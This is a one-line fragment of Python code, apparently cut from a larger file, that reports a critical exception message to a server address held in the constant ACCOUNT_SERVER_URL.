        send_to_server(ACCOUNT_SERVER_URL, {"error": f"Critical error: {e}"})